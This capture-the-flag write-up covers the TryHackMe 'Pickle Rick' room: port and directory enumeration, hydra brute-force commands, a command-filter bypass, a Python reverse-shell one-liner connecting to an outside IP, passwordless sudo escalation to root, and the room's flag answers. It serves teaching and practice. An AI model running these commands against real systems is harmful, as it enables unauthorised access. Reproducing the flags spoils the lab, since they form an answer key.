# 🔐 THM | Pickle Rick
## 📌 Overview

> This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

---
## 🔍 Enumeration

### Nmap Scan
First, I added the machine IP address to `/etc/hosts` and assigned it a domain name. Then, I enumerated all open ports on the target machine. For this, I used my own script, which automates an `nmap` scan and generates two output files.

![enum](/Challenges/pickle_rick/img/pr01_nmap.png)

```sh
# Nmap 7.95 scan initiated Sat Feb 28 13:14:52 2026 as: /usr/lib/nmap/nmap -sC -sV -p22,80 -Pn -oN services.txt picklerick.thm
Nmap scan report for picklerick.thm (10.82.150.18)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d0:f4:a2:72:1c:14:5a:e2:a3:79:f2:19:3e:87:a8:5b (RSA)
|   256 28:df:83:fb:7c:5b:ba:d3:1c:69:30:89:54:bc:0b:45 (ECDSA)
|_  256 8f:f6:1f:42:6f:4a:4c:eb:e8:59:91:82:54:33:b8:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 28 13:15:07 2026 -- 1 IP address (1 host up) scanned in 15.06 seconds

```
### Open Ports

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| 22   | ssh     | OpenSSH 8.2p1       |
| 80   | http    | Apache httpd 2.4.41 |

### Web Enumeration
Port **80** was open, so I accessed the web server to explore it further. The page itself did not provide much useful information. However, after inspecting the page source code, I found a comment containing the username: `R1ckRul3s`

![main_page](/Challenges/pickle_rick/img/pr02_main_page.png)

![comment](/Challenges/pickle_rick/img/pr03_comment.png)

Since no additional information was found on the main page, I performed directory enumeration to discover hidden endpoints.

```sh
gobuster dir -u http://picklerick.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip,tar,old
```

![gobuster](/Challenges/pickle_rick/img/pr04_gobuster.png)

### **Findings:**
The first interesting discovery was a `login.php` page.

![login](/Challenges/pickle_rick/img/pr05_login.png)

Additionally, after reviewing the `robots.txt` file, I found what initially seemed like a funny Easter egg — Rick’s famous phrase: `Wubbalubbadubdub`

![robots](/Challenges/pickle_rick/img/pr06_robots.png)
At this point, it didn’t seem important, but it later turned out to be very relevant.

---
## 💥 Exploitation

### Brute Force Attemps
First, I attempted to brute force the SSH service using `hydra` and the previously discovered username. However, SSH password authentication was disabled.

![ssh](/Challenges/pickle_rick/img/pr07_ssh.png)

Next, I tried brute-forcing the login page and supposedly there are 16 valid passwords, to no one's surprise, none of them works.

```sh
hydra -l R1ckRul3s -P /usr/share/wordlist/rockyou.txt picklerick.thm http-post-form "/login.php:username^USER^&password=^PASS^:F=invalid" -V
```

![hydra](/Challenges/pickle_rick/img/pr08_hydra.png)

At this point, I reconsidered the information gathered during enumeration. I remembered the supposed Easter egg in `robots.txt` and realized that it might actually be the password.
### Initial Access
Using:
- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`
I successfully logged into the portal.

In the portal page we found a panel were we can execute almost any command

![portal](/Challenges/pickle_rick/img/pr09_portal.png)

Since commands such as `cat`, `more`, `base64` and more were filtered we can try to bypass the filter using quotation marks

![command_disabled](/Challenges/pickle_rick/img/pr10_command_disabled.png)

![command_bypass](/Challenges/pickle_rick/img/pr11_command_bypass.png)

Eventually, to avoid filter limitations entirely, I obtained a reverse shell using Python:

```sh
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.137.54",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

**Shell obtained as:** `www-data`

---
## ⬆️ Privilege Escalation

Once inside the system, I checked whether the current user had sudo privileges:

![sudo](/Challenges/pickle_rick/img/pr12_sudo.png)

Owing to the user can run any command with sudo without requiring a password, obtain a root shell was really easy.

```sh
sudo sh
```

![root](/Challenges/pickle_rick/img/pr13_root.png)

**Escalated to:** `root`

After obtaining a root shell, retrieving the flags was trivial.

---
## 🚩 Flags

| Flag              | Value              |
| ----------------- | ------------------ |
| First Ingredient  | `mr. meeseek hair` |
| Second Ingredient | `1 jerry tear`     |
| Third Ingredient  | `fleeb juice`      |

---

## 💭 Final Thoughts

Overall, this room was relatively easy in terms of enumeration, initial access, and privilege escalation. However, I spent a considerable amount of time exploring unnecessary paths before focusing on the key clues.

This challenge reinforces an important lesson: never underestimate small details. What initially looked like a simple Easter egg turned out to be the key to gaining access.

It was a fun room and a good exercise to practice basic red teaming techniques.

Thanks for reading — I hope this write-up was helpful.